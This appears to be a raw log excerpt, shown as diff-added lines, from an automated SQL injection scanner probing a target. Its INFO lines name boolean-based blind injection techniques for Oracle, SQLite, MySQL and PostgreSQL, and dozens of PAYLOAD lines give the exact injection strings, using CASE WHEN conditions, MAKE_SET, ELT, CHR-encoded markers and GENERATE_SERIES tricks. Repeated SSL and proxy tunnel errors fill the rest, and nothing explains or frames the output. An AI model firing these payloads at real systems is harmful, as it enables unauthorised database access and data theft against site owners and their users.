+[08:24:49] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:49] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:49] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:49] [PAYLOAD] -8572'  OR (SELECT (CASE WHEN (2645=2645) THEN NULL ELSE CAST((CHR(122)||CHR(82)||CHR(100)||CHR(107)) AS NUMERIC) END)) IS NULL-- -
+[08:24:49] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:24:49] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:49] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:49] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:49] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
+[08:24:49] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo'  AND (SELECT (CASE WHEN (3572=8372) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,3572) END) FROM DUAL) IS NULL-- -
+[08:24:50] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:24:50] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:50] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:50] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:50] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo'  AND (SELECT (CASE WHEN (4490=4490) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,4490) END) FROM DUAL) IS NULL-- -
+[08:24:51] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:24:51] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:51] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:51] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:51] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
+[08:24:51] [PAYLOAD] -3075'  OR (SELECT (CASE WHEN (5680=7998) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5680) END) FROM DUAL) IS NULL-- -
+[08:24:51] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:24:51] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:51] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:51] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:51] [PAYLOAD] -1506'  OR (SELECT (CASE WHEN (4798=4798) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,4798) END) FROM DUAL) IS NULL-- -
+[08:24:52] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:24:52] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:52] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:52] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:52] [INFO] testing 'SQLite AND boolean-based blind - WHERE or HAVING clause (JSON)'
+[08:24:52] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo'  AND CASE WHEN 8249=8357 THEN 8249 ELSE JSON(CHAR(66,97,118,102)) END-- -
+[08:24:52] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:24:52] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:52] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:52] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:52] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo'  AND CASE WHEN 2286=2286 THEN 2286 ELSE JSON(CHAR(74,121,116,109)) END-- -
+[08:24:53] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:24:53] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:53] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:53] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:53] [INFO] testing 'SQLite OR boolean-based blind - WHERE or HAVING clause (JSON)'
+[08:24:53] [PAYLOAD] -6785'  OR CASE WHEN 6808=7407 THEN 6808 ELSE JSON(CHAR(90,105,78,100)) END-- -
+[08:24:53] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:24:53] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:53] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:53] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:53] [PAYLOAD] -8524'  OR CASE WHEN 7546=7546 THEN 7546 ELSE JSON(CHAR(102,76,66,121)) END-- -
+[08:24:54] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:24:54] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:54] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:54] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:54] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[08:24:54] [PAYLOAD] '  (SELECT (CASE WHEN (8824=3605) THEN 'plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ELSE (SELECT 3605 UNION SELECT 9872) END))-- -
+[08:24:54] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:24:54] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:54] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:54] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:54] [PAYLOAD] '  (SELECT (CASE WHEN (4434=4434) THEN 'plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ELSE (SELECT 5019 UNION SELECT 3075) END))-- -
+[08:24:55] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:24:55] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:55] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:55] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:55] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
+[08:24:55] [PAYLOAD] '  MAKE_SET(8156=2778,2778)-- -
+[08:24:55] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:24:55] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:55] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:55] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:55] [PAYLOAD] '  MAKE_SET(8005=8005,9995)-- -
+[08:24:56] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:24:56] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:56] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:56] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:56] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
+[08:24:56] [PAYLOAD] '  MAKE_SET(8501=1147,0x706c43467245384f79524168323939396e354d4a7267476b776c32473476734b6168516735654b6f)-- -
+[08:24:56] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:24:56] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:56] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:56] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:56] [PAYLOAD] '  MAKE_SET(9465=9465,0x706c43467245384f79524168323939396e354d4a7267476b776c32473476734b6168516735654b6f)-- -
+[08:24:57] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:24:57] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:57] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:57] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:57] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
+[08:24:57] [PAYLOAD] '  ELT(1761=9478,9478)-- -
+[08:24:58] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:24:58] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:58] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:58] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:58] [PAYLOAD] '  ELT(1863=1863,4345)-- -
+[08:24:58] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:24:58] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:58] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:58] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:58] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
+[08:24:58] [PAYLOAD] '  ELT(6216=9905,0x706c43467245384f79524168323939396e354d4a7267476b776c32473476734b6168516735654b6f)-- -
+[08:24:59] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:24:59] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:59] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:59] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:59] [PAYLOAD] '  ELT(2268=2268,0x706c43467245384f79524168323939396e354d4a7267476b776c32473476734b6168516735654b6f)-- -
+[08:24:59] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:24:59] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:59] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:59] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:59] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
+[08:24:59] [PAYLOAD] '  (8425=6066)*6066-- -
+[08:25:00] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:00] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:00] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:00] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:00] [PAYLOAD] '  (9471=9471)*9222-- -
+[08:25:00] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:00] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:00] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:00] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:00] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
+[08:25:00] [PAYLOAD] '  (9158=3777)*0x706c43467245384f79524168323939396e354d4a7267476b776c32473476734b6168516735654b6f-- -
+[08:25:01] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:01] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:01] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:01] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:01] [PAYLOAD] '  (9233=9233)*0x706c43467245384f79524168323939396e354d4a7267476b776c32473476734b6168516735654b6f-- -
+[08:25:01] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:01] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:01] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:01] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:01] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
+[08:25:01] [PAYLOAD] '  (SELECT (CASE WHEN (7782=6365) THEN 7782 ELSE 1/(SELECT 0) END))-- -
+[08:25:02] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:02] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:02] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:02] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:02] [PAYLOAD] '  (SELECT (CASE WHEN (6877=6877) THEN 6877 ELSE 1/(SELECT 0) END))-- -
+[08:25:02] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:02] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:02] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:02] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:02] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
+[08:25:02] [PAYLOAD] '  (SELECT (CASE WHEN (7640=3995) THEN (CHR(112)||CHR(108)||CHR(67)||CHR(70)||CHR(114)||CHR(69)||CHR(56)||CHR(79)||CHR(121)||CHR(82)||CHR(65)||CHR(104)||CHR(50)||CHR(57)||CHR(57)||CHR(57)||CHR(110)||CHR(53)||CHR(77)||CHR(74)||CHR(114)||CHR(103)||CHR(71)||CHR(107)||CHR(119)||CHR(108)||CHR(50)||CHR(71)||CHR(52)||CHR(118)||CHR(115)||CHR(75)||CHR(97)||CHR(104)||CHR(81)||CHR(103)||CHR(53)||CHR(101)||CHR(75)||CHR(111)) ELSE 1/(SELECT 0) END))-- -
+[08:25:03] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:03] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:03] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:03] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:03] [PAYLOAD] '  (SELECT (CASE WHEN (3843=3843) THEN (CHR(112)||CHR(108)||CHR(67)||CHR(70)||CHR(114)||CHR(69)||CHR(56)||CHR(79)||CHR(121)||CHR(82)||CHR(65)||CHR(104)||CHR(50)||CHR(57)||CHR(57)||CHR(57)||CHR(110)||CHR(53)||CHR(77)||CHR(74)||CHR(114)||CHR(103)||CHR(71)||CHR(107)||CHR(119)||CHR(108)||CHR(50)||CHR(71)||CHR(52)||CHR(118)||CHR(115)||CHR(75)||CHR(97)||CHR(104)||CHR(81)||CHR(103)||CHR(53)||CHR(101)||CHR(75)||CHR(111)) ELSE 1/(SELECT 0) END))-- -
+[08:25:03] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:03] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:03] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:03] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:03] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
+[08:25:03] [PAYLOAD] '  (SELECT * FROM GENERATE_SERIES(6946,6946,CASE WHEN (6946=4663) THEN 1 ELSE 0 END) LIMIT 1)-- -
+[08:25:04] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:04] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:04] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:04] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:04] [PAYLOAD] '  (SELECT * FROM GENERATE_SERIES(4213,4213,CASE WHEN (4213=4213) THEN 1 ELSE 0 END) LIMIT 1)-- -
+[08:25:05] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:05] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:05] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:05] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:05] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
+[08:25:05] [PAYLOAD] '  (SELECT (CHR(112)||CHR(108)||CHR(67)||CHR(70)||CHR(114)||CHR(69)||CHR(56)||CHR(79)||CHR(121)||CHR(82)||CHR(65)||CHR(104)||CHR(50)||CHR(57)||CHR(57)||CHR(57)||CHR(110)||CHR(53)||CHR(77)||CHR(74)||CHR(114)||CHR(103)||CHR(71)||CHR(107)||CHR(119)||CHR(108)||CHR(50)||CHR(71)||CHR(52)||CHR(118)||CHR(115)||CHR(75)||CHR(97)||CHR(104)||CHR(81)||CHR(103)||CHR(53)||CHR(101)||CHR(75)||CHR(111)) FROM GENERATE_SERIES(4771,4771,CASE WHEN (4771=2906) THEN 1 ELSE 0 END) LIMIT 1)-- -
+[08:25:05] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:05] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:05] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:05] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:05] [PAYLOAD] '  (SELECT (CHR(112)||CHR(108)||CHR(67)||CHR(70)||CHR(114)||CHR(69)||CHR(56)||CHR(79)||CHR(121)||CHR(82)||CHR(65)||CHR(104)||CHR(50)||CHR(57)||CHR(57)||CHR(57)||CHR(110)||CHR(53)||CHR(77)||CHR(74)||CHR(114)||CHR(103)||CHR(71)||CHR(107)||CHR(119)||CHR(108)||CHR(50)||CHR(71)||CHR(52)||CHR(118)||CHR(115)||CHR(75)||CHR(97)||CHR(104)||CHR(81)||CHR(103)||CHR(53)||CHR(101)||CHR(75)||CHR(111)) FROM GENERATE_SERIES(6252,6252,CASE WHEN (6252=6252) THEN 1 ELSE 0 END) LIMIT 1)-- -
+[08:25:06] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
